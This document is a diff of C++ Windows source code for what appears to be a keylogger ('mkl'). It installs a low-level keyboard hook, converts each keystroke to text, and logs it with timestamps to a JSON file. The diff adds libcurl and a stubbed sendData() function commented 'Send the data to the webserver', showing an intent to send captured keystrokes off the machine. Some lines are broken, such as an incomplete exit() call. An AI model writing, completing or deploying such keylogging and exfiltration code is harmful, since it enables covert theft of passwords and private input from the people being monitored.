@@ -11,6 +11,10 @@ namespace fs = std::filesystem;
 #include "dep/json.hpp"
 using json = nlohmann::ordered_json;
 
+//For Curl:
+#include <curl/curl.h>
+
+
 //status symbols
 const char* k = "[+] ";
 const char* i = "[*] ";
@@ -42,24 +46,18 @@ json data;
 std::string sJsonVersion = "0.0.0.1";
 int iEventCount = 0;
 
+//Add keyEvent to 'data'
 void addEvent(std::string key, bool mods[], int time){
 	iEventCount += 1;
 
-	//create event
-	//json event = {
-	//	{"id", iEventCount},
-	//	{"code", code},
-	//	{"mods", {
-	//		{"shft", mods[0]},
-	//		{"ctrl", mods[1]},
-	//		{"alt", mods[2]}}
-	//	},
-	//	{"time", time}
-	//};
-
-	//{k: '1', t: 4981483}
-
 	json event = {{"k", key},{"t", time}};
+
+	//Add event to events
+	data["events"].push_back(event);
+}
+
+//Write json content to file
+void writeTofile(){
 
 	//Check for output file
 	if (fs::exists(pOut)){
@@ -77,38 +75,27 @@ void addEvent(std::string key, bool mods[], int time){
 		data["events"] = json::array();
 	}
 
-	//Add event to events
-	data["events"].push_back(event);
-
 	//Write to file:
 	std::ofstream out(pOut);
 	out << data.dump(2);
-
 }
 
+//Send the data to the webserver
+bool sendData(){
 
-//Callback function for the hook!
+
+	return false;
+}
+
+//keyboard hook callback function
 LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 	
 	//Leave early if not a relevent msg
 	if (code < 0) { return CallNextHookEx(hHook, code, wParam, lParam);}
 
-	//lParam is a long long int that contains the memory address of a struct
-	//We need to actually create a proper pointer and set lParam as the address:
-	//We do this by creating a pointer of the type we want to access.
 	KBDLLHOOKSTRUCT* ptrKBDStruct;
-
-	//We then cast lParam to that type (pointer of KBDLLHOOKSTRUCT)
 	ptrKBDStruct = (KBDLLHOOKSTRUCT*)lParam;
-
-	//Now to read the data, we need to de-refrence the new pointer and get the data:
 	KBDLLHOOKSTRUCT data = *ptrKBDStruct;
-
-	//std::cout << i << "Key Code: " << data.vkCode << std::endl;
-	//std::cout << i << "Scan Code: " << data.scanCode << std::endl;
-	//std::cout << i << "flags: " << data.flags << std::endl;
-	//std::cout << i << "time: " << data.time << std::endl;
-	//std::cout << i << "info: " << data.dwExtraInfo << std::endl;
 
 	// === State Keys ===
 	//wParam contains type of msg, WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
@@ -162,12 +149,8 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 	if (std::find(vSysKeys.begin(), vSysKeys.end(), data.vkCode) == vSysKeys.end()){
 		//If it is a down stroke:
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
-			//print to terminal:
-			//std::cout << i << "Key: " << data.vkCode << " | Shift: " << shift << " | Ctrl: " << ctrl << " | Alt: " << alt <<  std::endl;
 
 			bool mods[3] = {shift, ctrl, alt};
-
-			//addEvent(data.vkCode, mods, data.time);
 
 			//Keyboard State
 			BYTE bKeyStates[256];
@@ -175,8 +158,6 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 			//write to keyStates
 			GetKeyboardState(bKeyStates);
 
-			//add in states manually:
-			//0x80 = key down
 			// Inject real modifier state from your hook tracking
 			if (shift) {
 			    bKeyStates[VK_SHIFT]   |= 0x80;
@@ -206,11 +187,6 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 			int result = ToUnicode(data.vkCode, data.scanCode, bKeyStates, pwszBuff, iBuffSize, iFlags);
 
 			//TODO: Temp Solution / UNSAFE!!!
-
-			//std::ofstream file(pOut, std::ios::app); // append mode
-
-    		//if (!file) return 1;
-
 			switch (pwszBuff[0]){
 				case VK_BACK:
 					sSwResult =  "[\\b]";
@@ -241,8 +217,6 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 					sSwResult = std::string(1,ascii);
 			}
 
-			//One We Have the resulting key, write to the output:
-			//file << sSwResult;
 			addEvent(sSwResult, mods, data.time);
 		}
 	}
@@ -256,14 +230,25 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 // === Main ===
 int main(int argc, char* argv[]){
 
+	/*=========================================
+		CURL Setup
+	=========================================*/
+
+	CURL* curl = curl_easy_init();
+
+	if (!curl) {
+		std::cout << e << "libcurl unable to link, exiting..." << std::endl;
+		exit()
+	}
+
+	/*=========================================
+		Path Setup
+	=========================================*/
 	//get root dir:
 	char szBuffer[MAX_PATH];
 
 	//Get the location of self:
-	GetModuleFileNameA(
-		NULL, //The proc handle you want to get the path to. when null, returns path of self 
-		szBuffer, //A pointer to a buffer that receives the fully qualified path of the module.
-		MAX_PATH); //The max size of the path
+	GetModuleFileNameA(NULL, szBuffer, MAX_PATH);
 
 	//set output path
 	pSelf = szBuffer;
@@ -275,34 +260,9 @@ int main(int argc, char* argv[]){
 	} 
 	else {std::cout << k << pOut.filename() << " found." << std::endl;}
 
-
-	//// === Init Json ===
-	//data["app"] = "mkl";
-	//data["version"] = sJsonVersion;
-//
-	////Make events array
-	//data["events"] = json::array();
-//
-	////Write to file:
-	//std::ofstream out(pOut);
-	//if (!out.is_open()) {
-	//	std::cout << e << "Unable to open file: " << GetLastError() << std::endl;
-	//	return 1;
-	//}
-	//
-	//out << data.dump(4);
-	//
-	//if (out.fail()) {
-	//	std::cout << e << "Init write Failed: " << GetLastError() << std::endl;
-	//	return 1;
-	//}
-//
-	//std::cout << k << "Init write success!" << std::endl;
-//
-	//out.close();
-	// =================
-
-
+	/*=========================================
+		Hook Setup
+	=========================================*/
 
 	//Set Windows Hook parameters
 	int idHook = WH_KEYBOARD_LL;
